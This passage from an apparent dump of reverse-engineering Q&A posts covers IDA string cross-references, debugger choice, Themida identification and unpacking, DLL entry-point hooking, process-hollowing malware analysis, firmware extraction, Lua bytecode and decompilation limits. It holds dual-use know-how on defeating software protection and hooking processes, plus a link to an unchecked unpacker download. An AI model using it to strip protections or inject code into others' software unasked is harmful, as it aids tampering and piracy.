  via the LLVM JIT to x86 machine code. All source architectures
  supported by qemu (x86, x86-64, ARM, SPARC, PowerPC, MIPS, m68k) can
  be translated to LLVM IR this way (e.g. adding support for x86 to
  llvm-qemu should be almost trivial).</p>
  
  <p>You can find llvm-qemu at <a href=""http://code.google.com/p/llvm-qemu/"" rel=""nofollow"">http://code.google.com/p/llvm-qemu/</a></p>
</blockquote>
","3425"
"I cannot find a text string referened in the the .rdata","2400","","<p>I'm trying to disassemble an application (built from a Chinese company in English).</p>

<p>I find the text string I want:</p>

<pre><code>.data:0041048C aEraseError     db 'Erase error !',0Ah,0 ; DATA XREF:
.rdata:0040C624o
.data:0041048C                                         ; .rdata:0040CF28o ...
</code></pre>

<p>But, I cannot locate it in the code anywhere. It's strange some text strings are found but others are not. </p>

<p>FYI: The application also loads a custom <code>.dll</code> file. The text is located in the main exe file's <code>.rdata</code> segment, but I just cannot see it in the code. I've tried with other disassemblers but I am using IDA.</p>
","<p>Your string seems to have an xref (cross reference, see below) from <code>0040C624</code>. This string might just be an entry in an array of error strings, with the array itself beginning just a little before <code>0040C624</code>. Your original source code may have looked like this:</p>

<pre><code>char *unused=""unused string"";
char *errors[] = {
    ""error 0"",
    ""some other error"",
    ""yet another error"",
    ""Erase error!"",
    ""...."",
};

void print_error_message(int index) {
    puts(errors[index]);
}

int handle_erase_error() {
    print_error_message(3);
}
</code></pre>

<p>If you compile this (i used gnu C on linux, <code>gcc -m32 xref.c</code>) and load the object code into IDA, it becomes (irrelevant parts omitted):</p>

<pre><code>.text:08000000 print_error_message proc near           ; CODE XREF: handle_erase_error+Dp
.text:08000000                 push    ebp
.text:08000001                 mov     ebp, esp
.text:08000003                 sub     esp, 18h
.text:08000006                 mov     eax, [ebp+8]
.text:08000009                 mov     eax, errors[eax*4]
.text:08000010                 mov     [esp], eax      ; s
.text:08000013                 call    puts
.text:08000018                 leave
.text:08000019                 retn
.text:08000019 print_error_message endp


.data:08000030 unused          dd offset aUnusedString ; ""unused string""
.data:08000034 errors          dd offset aError0       ; DATA XREF: print_error_message+9r
.data:08000034                                         ; ""error 0""
.data:08000038                 dd offset aSomeOtherError ; ""some other error""
.data:0800003C                 dd offset aYetAnotherErro ; ""yet another error""
.data:08000040                 dd offset aEraseError   ; ""Erase error!""
.data:08000044                 dd offset a____         ; ""....""

.rodata:08000049 aUnusedString   db 'unused string',0    ; DATA XREF: .data:unusedo
.rodata:08000057 aError0         db 'error 0',0          ; DATA XREF: .data:errorso
.rodata:0800005F aSomeOtherError db 'some other error',0 ; DATA XREF: .data:08000038o
.rodata:08000070 aYetAnotherErro db 'yet another error',0 ; DATA XREF: .data:0800003Co
.rodata:08000082 aEraseError     db 'Erase error!',0     ; DATA XREF: .data:08000040o
.rodata:0800008F a____           db '....',0             ; DATA XREF: .data:08000044o
</code></pre>

<p>You see that each string has a pointer entry in the <code>data</code> section, and the ascii data in the <code>rodata</code> (read only data) section. And each of the ascii strings has an xref (cross reference) to the pointer that points to it - this is not a part of the binary; ida detects where each string is referenced, and generates the ""backreferences"", or xrefs.</p>

<p>The important thing is: you can use this to find the string table (errors, at <code>0x08000034</code>) if you have only the ascii bytes. And you can find where the string table itself is used by looking at its xref - from the print_error_message function. In contrast, the unused string does <em>not</em> have an xref, because it isn't used anywhere.</p>

<p>Ida will allow you to double-click on the xref to move to where it 'comes from' to navigate easily.</p>

<p>I'd check if you have an array of strings that starts a bit before the xref to your string, where it gets used, and possibly where the using function gets called.</p>

<hr>

<p>Another possibility is something that i saw a few days ago in an ARM android shared library. The library had some strings holding function names, directly after each other, like this (translated to x86 syntax)</p>

<pre><code>errmsg    db 'Error in %s, file %s, line %d\n', 0
strtab    db 'opencachefile', 0
          db 'closecachefile', 0
          db 'getcacheentry', 0
          db 'putcacheentry', 0
          db 'delcacheentry', 0
</code></pre>

<p>The function that got something from cache used the third of these strings to log a possible error. The code looked like this (again, translated from arm to x86):</p>

<pre><code>...
mov    eax, offset strtab
add    eax, 29           ;&lt;-- difference in bytes between 'open' and 'get'
push   eax
mov    eax, offset errmsg
push   eax
call   android_log_print
</code></pre>

<p>The other functions had similar constructs, so <code>strtab</code> was referenced 5 times (one in each function), and the byte difference adjusted in each of them. I sincerely don't know why a compiler would do this, but just <em>maybe</em> something similar is going on in your code.</p>
","9037"
"Should I switch from WinDbg to OllyDbg?","2385","","<p>I am fairly familiar with WinDbg and didn't know about OllyDbg before. From the statistics in this forum, it seems that OllyDbg is twice as popular as WinDbg. Sometimes WinDbg can be frustrating, so I wonder whether I should switch.</p>

<p>To make this question less opinion based, these are my requirements:</p>

<ul>
<li>be able to debug .NET. From my research it seems that OllyDbg might not be as good as WinDbg with SOS and SOSEX</li>
<li>do scripting. Here it seems OllyDbg is better. There are many scripts archived in a single place, which is not the case for WinDbg.</li>
<li>analyze mini dump files. This could be a blocker: while the OllyDbg website states something about post mortem dump, I was unable to find an option to open a dump immediately (File/Open).</li>
<li>record logs of what I'm doing to be able to give it to the customer. From the Google picture search I only see screenshots from registers, memory etc. I have not seen something similar to the WinDbg command output window.</li>
</ul>

<p><strong>Given these core requirements, should I give OllyDbg a try?</strong></p>

<p>Version information: OllyDbg 2.01</p>
","<p>Given your requirements, you'd be much better off sticking with WinDbg.</p>

<p>OllyDbg doesn't do .NET, nor is it capable of directly analyzing minidumps. It does have the ability to log its run traces, but this is likely not the type of logging that you need.</p>

<p>OdbgScript is nice, but it sounds like that's not enough of a reason for you to make the change.</p>
","3433"
"What's the packer/encrypter used with this file","2371","","<p>I used PEiD &amp; Stud_PE to get the packer/encrypter signature but unfortunately they didn't detect it.</p>

<p><a href=""https://i.stack.imgur.com/iJurl.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/iJurl.png"" alt=""enter image description here""></a></p>

<p>could someone help with this issue?</p>

<p><strong>EDIT:</strong>
As @beatcracker said in comments, using ExeinfoPe says:
<a href=""https://i.stack.imgur.com/7W4D4.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/7W4D4.png"" alt=""enter image description here""></a></p>
","<blockquote>
  <p>I used PEiD &amp; Stud_PE to get the packer/encrypter signature but
  unfortunately they didn't detect it.</p>
</blockquote>

<p><a href=""http://www.exeinfo.xn.pl"" rel=""nofollow"">Exeinfo PE</a> has more recent signatures (beware of gifs, though).</p>

<blockquote>
  <p><strong>EDIT:</strong> As @beatcracker said in comments, using ExeinfoPe says:</p>
  
  <p><em>Detected Themida v2.x Inside, Themida Code on Section</em>.</p>
  
  <p>Is there a native exe unpacker for Themida ?</p>
</blockquote>

<p>Themida is very hard to unpack (even the new driverless versions), there is a ton of protections options that can be enabled (see <a href=""http://www.oreans.com/ThemidaHelp.pdf"" rel=""nofollow"">manual</a>), so I doubt that there is a generic unpacker in the wild.</p>

<p>Try this tutotial: <a href=""http://forum.xentax.com/viewtopic.php?f=29&amp;t=12953"" rel=""nofollow"">How Unpack Themida 2.x.x</a>. It uses OllyDbg script which hides most of the complexity required to unpack\fix Themida.</p>

<h3>References:</h3>

<ul>
<li><a href=""https://forum.tuts4you.com/topic/34085-themida-winlicense-ultra-unpacker-14/"" rel=""nofollow"">Original link to sript's author post on Tuts4You (requires registration to view)</a></li>
<li>Files from the post above (includes video converted to <code>exe</code>, I've not checked it so be careful): <a href=""https://www.sendspace.com/file/9pu8z8"" rel=""nofollow"">Themida - Winlicense Ultra Unpacker 1.4 - Tutorial.rar</a></li>
<li><a href=""https://exelab.ru/F/index.php?action=vthread&amp;forum=13&amp;topic=16798"" rel=""nofollow"">Themida unpacking thread at eXeL@B forums (Russian)</a></li>
</ul>
","11523"
"How to hook the entry point of a DLL?","2363","","<p>I have written a C API with support for static import hooking via overwriting the corresponding IAT entry of an exported function. It works nicely for older simple applications, but for more modern applications, it is less effective. This is primarily due to the large amount of applications nowadays that dynamically import functions. </p>

<p>My solution to this problem was to create the process in an initial suspended state and then hook the <code>LoadLibrary(Ex)(A/W)</code>  family of functions along with <code>GetProcAddress()</code> to replace the retrieved address of a target function with my own. That solution is limited in part due to the fact that it is based off the application only importing dynamic functions and libraries in the executable module, without working for processes created later ( although that could be solved by hooking <code>CreateProcess()</code> ) or more importantly, <strong>it doesn't handle the DLLs in the application that also call the target functions I want to hook</strong>. This is obviously because the DLLs have a separate import section in their own PE from the executable module. </p>

<p>Which brings me to my question, <em>how do I hook the entry point of a DLL</em>? I want to implement that method because I need the DLL to be bound to the libraries it imports statically, so I can hook  the LoadLibrary/GetProcAddress functions in before the DLL has a chance to load/import them in DLLMain. I'm assuming there is a way to do this by changing the entry point of the DLL, or by hooking a lower level function that handles calling a DLL entry point in kernel32.dll. </p>

<p>If the method I'm requesting has a better alternative, then I would gladly accept that solution as well if it achieves my desired effect.</p>

<p>My processor is an AMD Athlon II X2 250 that is x86-x64 compatible, and my operating system is Windows 7.</p>
","<p>To answer the original question, what you can do is to hook <a href=""http://doxygen.reactos.org/d8/d55/ldrutils_8c_a8fabcfb642b2788989401d1ac7cee130.html"" rel=""nofollow""><code>LdrpCallInitRoutine</code></a> in <code>ntdll.dll</code>. This function is used by DLL loading/unloading code to actually call the DLL entry point (<code>DllMain</code>) and also the TLS callbacks. The first argument is the address to be called:</p>

<pre><code>BOOLEAN NTAPI LdrpCallInitRoutine(PDLL_INIT_ROUTINE EntryPoint, PVOID BaseAddress, ULONG Reason, PVOID Context);
</code></pre>
","6023"
"How to start learning reverse engineering to eventually help exploiting of modern consoles like Xbox One, PS4?","2361","","<p>How can someone with little programming knowledge except for some Ruby on Rails/Ruby begin on a path of Reverse Engineering as a hobbyist to help the exploitation process of modern-day gaming consoles like Xbox Ones and PS4s?</p>

<p>I realize there is no simple ""do this, then that"" spoon-fed process of learning an extremely diverse subject matter like reversing but there are such vast amounts of tutorials that I have no idea which ones really pertain to my interest of specifically <strong><em>game console exploitation</em></strong>! I really want to help contribute to the long-term process of finding these vulnerabilities and get unsigned code running on these systems</p>
","<p>Some things you will inevitably have to know at some degree to be able to reverse engineer Game Consoles:</p>

<ul>
<li><p>Learn a lower level language such as C or C++. Most, if not all, Console games, modern and old, use these two languages for the bulk of the game (AKA, the Engine). This is important for my next point, which is:</p></li>
<li><p>Learn about the architecture of game software. Internally, games are not very different from one another. There are common data structures and algorithms that are needed by most games, and these needs reflect in the hardware. Learning the tools that engineers used to create these structures (C/C++) and knowing the structures and algorithms themselves, will help a lot when you have to make assumptions and guesses during the hacking process.</p></li>
<li><p>You'll obviously have to get familiar with hexadecimal dumps and assembly languages to be able to make sense of reversed Console code and ROMs.</p></li>
<li><p>Write a console game, preferably using an unofficial SDK. This is something that can also greatly improve your knowledge of the hardware and platform. Find out about the ""home brew"" community for your favorite Console and attempt to write a simple game using the available tools. You will have to solve a lot of hardware-specific problems and do a lot of guessing, since documentation is frequently rare. You'll gain valuable knowledge in the process.</p></li>
<li><p>Contribute to an emulator project. This is also a great way of acquiring knowledge about the hardware. The best possible way, I'd argue, since you will be trying to mimic the hardware with a piece of software.</p></li>
</ul>
","6869"
"How to decompile an exe file?","2352","","<p>I have been wondering, if every program is based on machine code, can we not decompile a program until it hits machine code and make it up to real programming languages? </p>

<p>How to decompile exe files with a rate of 100%? If my computer understands the processes it should take, isn't it also be able return me the steps of what's its done, values from memory exc..? </p>

<p>How do I decompile an exe file without an error?</p>
","<ol>
<li><blockquote>
  <p>I have been wondering, if every program is based on machine code, can we not decompile a program until it hits machine code and make it up to real programming languages?</p>
</blockquote>

<p>This question is based on a false premise; namely that every program is based on machine code. Programs are typically written in high-level languages, which are by design architecture independent and therefore must be translated into an architecture-specific form in order to be executed:</p>

<ul>
<li><blockquote>
  <p>“High-level” programming languages take their name from the relatively
  high level, or degree of abstraction, of the features they provide, relative to those of the assembly languages they were originally designed to replace. The adjective “abstract,” in this context, refers to the degree to which language features are separated from the details of any particular computer architecture.<sup>1</sup> </p>
</blockquote></li>
<li><blockquote>
  <p>Machine independence is a fairly simple concept. Basically it says that a programming language should not rely on the features of any particular instruction set for its efficient implementation.<sup>1</sup></p>
</blockquote></li>
</ul>

<p>Programming languages are examples of formal languages:</p>

<ul>
<li><a href=""https://cs.stackexchange.com/questions/30639/what-is-the-relationship-between-programming-languages-regular-expressions-and/30667#30667"">What is the Relationship Between Programming Languages, Regular Expressions and Formal Languages</a></li>
<li><a href=""http://www.its.caltech.edu/~matilde/FormalLanguageTheory.pdf"" rel=""nofollow noreferrer"">Formal Language Theory</a></li>
<li><a href=""https://en.wikipedia.org/wiki/Syntax_(programming_languages)#Levels_of_syntax"" rel=""nofollow noreferrer"">Programming language syntax</a>
<br>
<br></li>
</ul>

<p>The translation of the series of statements written in a programming language in a program source file to semantically equivalent object code is accomplished by a compiler. Decompilation involves translation of architecture-dependent object code to a semantically equivalent representation (source code) that is not architecture specific, the reverse process of compilation.</p></li>
<li><blockquote>
  <p>How to decompile exe files with a rate of 100%? </p>
</blockquote>

<p>This does not seem to be possible.</p>

<blockquote>
  <p>Certainly, fully automated decompilation of arbitrary machine-code programs is not possible -- this problem is theoretically equivalent to the Halting Problem, an undecidable problem in Computer Science. What this means is that automatic (no expert intervention) decompilation cannot be achieved for all possible programs that are ever written. Further, even if a certain degree of success is achieved, the automatically generated program will probably lack meaningful variable and function names as these are not normally stored in an executable file (except when stored for debugging purposes).<sup><a href=""http://program-transformation.org/Transform/DecompilationPossible"" rel=""nofollow noreferrer"">2</a></sup></p>
</blockquote></li>
</ol>

<p>Further description of the challenges posed for decompilation can be found here:</p>

<ul>
<li><a href=""https://yurichev.com/mirrors/DCC_decompilation_thesis.pdf"" rel=""nofollow noreferrer"">Reverse Compilation Techniques</a></li>
<li><a href=""https://users.ece.cmu.edu/~dbrumley/pdf/Schwartz%20et%20al._2013_Native%20x86%20Decompilation%20using%20Semantics-Preserving%20Structural%20Analysis%20and%20Iterative%20Control-Flow%20Structuring.pdf"" rel=""nofollow noreferrer"">Native x86 Decompilation using Semantics-Preserving Structural Analysis and Iterative Control-Flow Structuring</a></li>
<li><a href=""http://decompilation.info/sites/all/files/articles/C%20decompilation.pdf"" rel=""nofollow noreferrer"">C Decompilation: Is It Possible?</a></li>
</ul>

<p>In fact, correct disassembly (much less decompilation) is a major challenge:</p>

<ul>
<li><a href=""https://reverseengineering.stackexchange.com/questions/2580/why-is-disassembly-not-an-exact-science/8677#8677"">Why is disassembly not an exact science</a></li>
<li><a href=""https://silviocesare.wordpress.com/2007/11/17/on-disassembling-obfuscated-assembly/"" rel=""nofollow noreferrer"">Disassembling Obfuscated Assembly</a></li>
</ul>

<hr>

<p><sub>1. Scott, Michael L. <em>Programming Language Pragmatics</em>. 3rd ed. Page 111</sub></p>

<p><sub>2. <a href=""http://program-transformation.org/Transform/DecompilationPossible"" rel=""nofollow noreferrer"">Is Decompilation Possible?</a></sub></p>
","16695"
"Ollydbg 2: Breaking after attaching to a suspended process","2351","","<p>When analyzing malware, I come across packers that inject the actual malware code into a newly spawned process and execute it that way. For that, they create a process in suspended state, inject the code and resume it using <code>ntdll.NtResumeThread</code> on Windows.</p>

<p>I would like to attach to the suspended process after the injection is done, to dump the memory and get the unpacked binary. For that, I break at <code>ntdll.NtResumeThread</code>. Using Olly 2, I can attach to the suspended process.</p>

<p>My problem is now that this seems to resume the process. That would be okay if it would break at the entry point. But it doesn't. Olly does not break until the process I attached to has terminated. Yes, I can dump the memory then. But only if it was not modified by the malware. Also, I don't want the malware code to run at all during unpacking.</p>

<p>So, is there a way to make Olly break (reliably) at the entry point of the new process?</p>

<p>Thanks in advance!</p>
","<p>FYI, the injection method to which you're referring is called <strong>dynamic forking</strong> or <strong>process hollowing</strong>.</p>

<p>When you attach to the child process with OllyDbg, OllyDbg will create a new thread for itself, but the main thread (the one that would have been resumed with <code>NtResumeThread()</code> from the parent) will still be suspended. Once you've attached with OllyDbg, you can set a breakpoint on the OEP and resume the suspended thread; this will cause OllyDbg to then break at the OEP.</p>
","4608"
"Unpack Billion 5102 firmware","2344","","<p>I'm trying to unpack this firmware image but I'm getting some issues understanding the structure.</p>

<p>First of all I have one image which I called firmware.bin, and the file command shows me that it's a LIF file:</p>

<pre><code>firmware.bin: lif file
</code></pre>

<p>After that I analyze it with binwalk:</p>

<pre><code>DECIMAL     HEX         DESCRIPTION
-------------------------------------------------------------------------------------------------------
84992       0x14C00     ZynOS header, header size: 48 bytes, rom image type: ROMBIN, uncompressed size: 65616, compressed size: 16606, uncompressed checksum: 0xBA2A, compressed checksum: 0x913E, flags: 0xE0, uncompressed checksum is valid, the binary is compressed, compressed checksum is valid, memory map table address: 0x0
85043       0x14C33     LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 65616 bytes
128002      0x1F402     GIF image data, version 8""9a"", 200 x 50
136194      0x21402     GIF image data, version 8""7a"", 153 x 55
349184      0x55400     ZynOS header, header size: 48 bytes, rom image type: ROMBIN, uncompressed size: 3113824, compressed size: 733298, uncompressed checksum: 0x3B9C, compressed checksum: 0xBBBA, flags: 0xE0, uncompressed checksum is valid, the binary is compressed, compressed checksum is valid, memory map table address: 0x0
349235      0x55433     LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 3113824 bytes
</code></pre>

<p>As you can see there are 2 LZMA, 2 ZynOS (LZMA also once cut) and 2 images. Once I extract the LZMA I uncompress it and the first one is a single binary, but the second one is another LZMA file with 127 files in it, and each one of those files have a lot of new files inside.</p>

<p><img src=""https://i.stack.imgur.com/l7AbK.png"" alt=""File content sample""></p>

<p>I guess that I'm not following the correct steps to unpack it, so I'm wondering how could I get the main filesystem clean?.</p>
","<p>The output from the file utility, as you've probably guessed, is a false positive. The beginning of the firmware.bin file contains what looks to be a basic header (note the ""SIG"" string near the beginning of the file), and a bunch of MIPS executable code, which is likely the bootloader:</p>

<pre><code>DECIMAL         HEX             DESCRIPTION
-------------------------------------------------------------------------------------------------------------------
196             0xC4            MIPS instructions, function epilogue
284             0x11C           MIPS instructions, function epilogue
372             0x174           MIPS instructions, function epilogue
388             0x184           MIPS instructions, function epilogue
416             0x1A0           MIPS instructions, function epilogue
424             0x1A8           MIPS instructions, function prologue
592             0x250           MIPS instructions, function epilogue
712             0x2C8           MIPS instructions, function epilogue
720             0x2D0           MIPS instructions, function prologue
832             0x340           MIPS instructions, function epilogue
840             0x348           MIPS instructions, function prologue
912             0x390           MIPS instructions, function epilogue
920             0x398           MIPS instructions, function prologue
976             0x3D0           MIPS instructions, function epilogue
984             0x3D8           MIPS instructions, function epilogue
1084            0x43C           MIPS instructions, function epilogue
1192            0x4A8           MIPS instructions, function epilogue
1264            0x4F0           MIPS instructions, function epilogue
...
</code></pre>

<p>Running strings on the firmware.bin binary seems backup this hypothesis, with many references to checksum and decompression errors:</p>

<pre><code>checksum error! (cal=%04X, should=%04X)
     signature error!
     (Compressed)
start: %p
     unmatched objtype between memMapTab and image!
     Length: %X, Checksum: %04X
     Version: %s, 
     Compressed Length: %X, Checksum: %04X
memMapTab Checksum Error! (cal=%04X, should=%04X)
memMapTab Checksum Error!
%3d: %s(%s), start=%p, len=%X
%s Section:
memMapTab: %d entries, start = %p, checksum = %04X
$USER Section:
signature error!
ROMIO image start at %p
code length: %X
code version: %s
code start: %p
Decompressed image Error!
Decompressed image Checksum Error! (cal=%04X, should=%04X)
ROM length(%X) &gt; RAM length (%X)!
Can't find %s in $ROM section.
Can't find %s in $RAM section.
RasCode
</code></pre>

<p>A quick examination of the strings in the two decompressed LZMA files you found shows that the smaller one (at offset 0x14C33) appears to contain some debug interface code, likely designed to be accessed via the device's UART:</p>

<pre><code>                        UART INTERNAL  LOOPBACK TEST
                        UART EXTERNAL  LOOPBACK TEST
ERROR
======= HTP Command Listing =======
&lt; press any key to continue &gt;
 macPHYCtrl.value=
                        MAC INTERNAL LOOPBACK TEST 
                        MAC EXTERNAL LOOPBACK TEST 
                        MAC INTERNAL LOOPBACK 
                        MAC EXTERNAL LOOPBACK 
 LanIntLoopBack ...
Tx Path Full, Drop packet:%d
0x%08x
tx descrip %d:
rx descrip %d:
%02X 
%08X: 
&lt; Press any key to Continue, ESC to Quit &gt;
0123456789abcdefghijklmnopqrstuvwxyz
0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ
&lt;NULL&gt;
) Register Dump *****
***** ATM SAR Module: VC(
Reset&amp;Identify reg   = 
Traffic Sched. TB reg= 
TX Data ctrl/stat reg= 
RX Data ctrl/stat reg= 
Last IRQ Status reg  = 
IRQ Queue Entry len  = 
VC IRQ Mask register = 
TX Data Current descr= 
RX Data Current descr= 
TX Traffic PCR       = 
TX Traffic MBS/Type  = 
TX Total Data Count  = 
VC IRQ CC Mask reg   = 
TX CC Current descr  = 
TX CC Total Count    = 
RX Miss Cell Count   = 
***** ATM SAR Module: Common Register Dump *****
</code></pre>

<p>The second larger file (at offset 0x55433) appears to contain the ThreadX RTOS, by Green Hills:</p>

<pre><code>RTA231CV Reserved String
anonymous
www.huawei.com
1000
tc-e4f6ed2f5b87&lt;
MSFT 5.07
user&lt;
MSFT 5.07
LXT972
""AC101L
CIP101
RTL8201
CAC201
jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
jjjjjjjj
jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
jjjjjjjj
jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
System Timer Thread
Copyright (c) 1996-2000 Express Logic Inc. * ThreadX R3900/Green Hills Version G3.0f.3.0b *
</code></pre>

<p>If you aren't familiar with RTOS's, they typically are just one big kernel with no concept of user space vs kernel space or what you would think of as a normal file system, although they will contain things like images and HTML files for this device's Web interface (see <a href=""http://www.devttys0.com/2011/06/mystery-file-system/"" rel=""nofollow"">here</a> for an example of how these types of files are stored/accessed in some VxWorks systems). </p>

<p>I'd say that you already pretty much have this firmware extracted into its basic parts. To further analyze the bootloader or the two extracted LZMA files, you will need to start disassembling those files, which entails determining the memory address where they are loaded at boot time, identifying code/data sections, looking for possible symbol tables, identifying common functions, and probably writing some scripts to help with all of the above.</p>
","2559"
"Decompiling/disassembling lua bytecode","2343","","<p>I've been experimenting with decompiling Lua bytecode and found useful tools like unluac, and LuaAssemblyTools. Unluac seems to do the trick with lua scripts compiled with luac giving me almost the exact source code, however when I convert lua script to bytecode using the code:</p>

<pre><code>file:write(string.dump(loadfile(filename)))
</code></pre>

<p>I get a different output than with luac, however they are very much the same being only a byte extra at (a lot of) different places. Now this new file will give me an <code>IllegalState exception</code> from unluac and when I try to run the bytecode file (created by the code line above) in luac with the -l option I get:</p>

<pre><code>C:\MyDir&gt;luac -l stringdumped.txt
luac: stringdumped.txt: bad integer in precompiled chunk
</code></pre>

<p>So there is clearly a difference between <code>string.dump</code> and luac, even though it is suggested here: <a href=""http://lua-users.org/wiki/LuaCompilerInLua"" rel=""nofollow"">http://lua-users.org/wiki/LuaCompilerInLua</a> to use <code>string.dump</code> as an emulator for luac.</p>

<p>Could anyone explain the difference to me, and suggest how I would go about reversing a <code>string.dump</code> ""compiled"" script?</p>
","<p>There is virtually no difference between the bytecode emitted by <code>loadfile</code> and <code>luac</code>.
The only possible reason for the error you are getting is that you are opening the file <em>stringdumped.txt</em> in text mode. Try the following code and see if there are any errors</p>

<pre><code>f = io.open(""stringdumped.txt"", ""wb"") --Note that file is opened in binary mode
f:write(string.dump(loadfile(""sample.lua"")))
f:close()
</code></pre>

<p>Since there is no difference, the output file <em>stringdumped.txt</em> can both be run by the lua interpreter as well as decompiled by <em>unluac</em>. The reversing steps too are exactly similar as you would do with any other compiled lua scripts.</p>
","5829"
"Find the C++ STL functions in a binary","2342","","<p>I have a binary file (actually, an operating system for an ARM embedded device which also contains some high-level apps (hard coded in the user interface)).</p>

<p>I know some parts of the operating system are from C++ code, so it is likely the binary contains the C++ STL.</p>

<p>However, I don't know much about the STL.</p>

<p>Would you have a method to find the address of the STL functions?
(the basic method of searching for the ""map"", ""vector"", ... string was unsuccessful and I don't know any specific feature I could search for in this case)</p>

<p>Is there some kind of signature for the STL functions?</p>

<p>Thanks!</p>

<p>Additional informations: I use IDA. I can run the OS with a GDB. I know the address of much of the standard C functions (ctype/stddio/...).</p>
","<p>Libraries like STL or Boost are tricky. Because they're heavily template-based and most of their code is generated at compile time, it's pretty difficult to make FLIRT-style signatures for them. Too much depends on the specific compiler, build options, optimization settings and so on, so unless you match them pretty closely when generating signatures, you're unlikely to get many good hits.</p>

<p>However, you may be able to find some signs of them. For example, the typical <code>std::string</code> implementation in some cases throws exceptions <code>length_error</code> or <code>out_of_range</code>. You might be able to find references to the error text or the exception names. Other than that I think there's not much you can look for besides recognizing a specific implementation from the actual code.</p>

<p>However, since you mention it's an RTOS, I highly doubt it's using STL. In an OS, any non-deterministic behavior is a bad thing, and with STL you can get an exception basically at any time. They may use some limited C++ for better encapsulation but any high-level classes are likely to be custom-made and not from STL or Boost.</p>
","3890"
"IDA PRO Structures Defining negative offset -4 -8 offset repair asm Hex-Rays","2341","","<p>How do I fix structures in IDA PRO so they show up properly in Hex-Rays plugin (C decompiler).</p>

<p>Similar question to: (But the solution doesn't work for me)<br> <a href=""https://reverseengineering.stackexchange.com/questions/2991/struct-with-negative-offset-in-ida-possible"">Struct with negative offset in IDA possible</a></p>

<p>Pretty much what happened is I compiled a very good program and it works right, after that I did many changes to it and now it works worse then the older version, I'm trying to figure out what I did wrong (since I lost the source code now) to revert back to the old version. (I also added below the original piece of the code written in C++, which didn't change between both versions).</p>

<p>Structure's addresses somehow optimized in IDA PRO
Such as that</p>

<pre><code>*(_BYTE *)(shipsStruct + 279) = 1; //Ships[i].used = true;
</code></pre>

<p>should really be <code>[10x4]=40+255= 295</code></p>

<pre><code>*(_BYTE *)(shipsStruct + 295) = 1;  //Ships[i].used = true;
</code></pre>

<p>You can tell the structure size right here (<code>shipsStruct += 296;</code>)</p>

<p>I'm guessing somehow the un-used structure members are stripped out (but why is the structure size valid?).<br>
Seems the assembly somehow is offset wrongly (how do I add the proper offset deltas to the struct to fix this)?</p>

<p>When I try this tip <a href=""http://www.hexblog.com/?p=63"" rel=""nofollow noreferrer"">http://www.hexblog.com/?p=63</a> 
My whole IDA PRO freezes up when I select the line <code>mov edi, offset dword_10004C38</code> and press T (IDA PRO 6.1)</p>

<p><img src=""https://i.stack.imgur.com/GBJzX.png"" alt=""structoffset""></p>

<p>Seems I made my struct incorrectly?<br></p>

<p>Here is how the code decompiled code looks like (without applying structure)</p>

<pre><code>  if ( playerListBaseAddress &amp;&amp; !IsBadReadPtr(playerListBaseAddress, 4u) )
  {
    shipsStruct = (int)dword_10004C38;
    while ( 1 )
    {
      playerPointer = (struct_v3 *)*((_DWORD *)playerListBaseAddress + maxPlayers);
      if ( !playerPointer )
        break;
      if ( IsBadReadPtr(playerPointer, 4u) )
        break;
      *(_DWORD *)(shipsStruct - 4) = playerPointer-&gt;ssXCoord;
      *(_DWORD *)shipsStruct = playerPointer-&gt;ssYCoord;
      *(_DWORD *)(shipsStruct + 4) = playerPointer-&gt;ssXSpeed;
      *(_DWORD *)(shipsStruct + 8) = playerPointer-&gt;ssYSpeed;
      *(_DWORD *)(shipsStruct - 8) = playerPointer-&gt;ssFreq;
      *(_DWORD *)(shipsStruct + 20) = playerPointer-&gt;ssShipNum;
      if ( playerPointer-&gt;ssPlayerName )
        strcpy_s((char *)(shipsStruct + 24), 0xFFu, &amp;playerPointer-&gt;ssPlayerName);
      *(_BYTE *)(shipsStruct + 279) = 1;
      if ( v37 == playerPointer )
        break;
      shipsStruct += 296;
      ++maxPlayers;
      v37 = playerPointer;
      if ( shipsStruct &gt;= (signed int)&amp;unk_10017310 )
        goto finish;
    }
    v34 = maxPlayers;
    if ( maxPlayers &lt; 255 )
    {
      v4 = (int)((char *)&amp;unk_10004D4F + 296 * maxPlayers);
      do
      {
        *(_BYTE *)v4 = 0;
        v4 += 296;
      }
      while ( v4 &lt; (signed int)&amp;unk_10017427 );
    }
</code></pre>

<p>Here is the orginal code (not decompiled written in C++)</p>

<pre><code>double currentTimer = GetTimer();
double timeElapsed = currentTimer - lastTimer;

int maxPlayers = 0;
DWORD lastPlayerPtr = 0;
if (playerListBaseAddress != NULL &amp;&amp; !IsBadReadPtr((void *) playerListBaseAddress, sizeof(ULONG_PTR))) {
    for (int i = 0; i &lt; 255; i++) { //populate player ship list.
    DWORD playerPtr = *(DWORD *) (playerListBaseAddress + (i * 4));

    if (playerPtr != NULL &amp;&amp; !IsBadReadPtr((void *) playerPtr, sizeof(ULONG_PTR))) {
        Ships[i].XCoordinate = *(DWORD *) (playerPtr + 0x4);
        Ships[i].YCoordinate = *(DWORD *) (playerPtr + 0x8);
        Ships[i].XSpeed = *(signed long *) (playerPtr + 0x10);
        Ships[i].YSpeed = *(signed long *) (playerPtr + 0x14);
        Ships[i].Freq = *(DWORD *) (playerPtr + 0x58);
        Ships[i].ShipNum = *(BYTE *) (playerPtr + 0x5C)
        //memcpy(&amp;(Ships[i].Name), (void*)((DWORD)playerPtr+0x6D), 19);
        if (!*(BYTE *) (playerPtr + 0x6D) == NULL)
        strcpy_s(Ships[i].Name, (char *) ((DWORD) playerPtr + 0x6D));
        Ships[i].used = true;

        if (lastPlayerPtr == playerPtr)
        goto finishList;
        lastPlayerPtr = playerPtr;
    } else {
      finishList:
        maxPlayers = i;
        for (int j = i; j &lt; 255; j++)
        Ships[j].used = false;
        break;
    }
}
</code></pre>

<p>Here is before and after (applying my custom struct)<br>
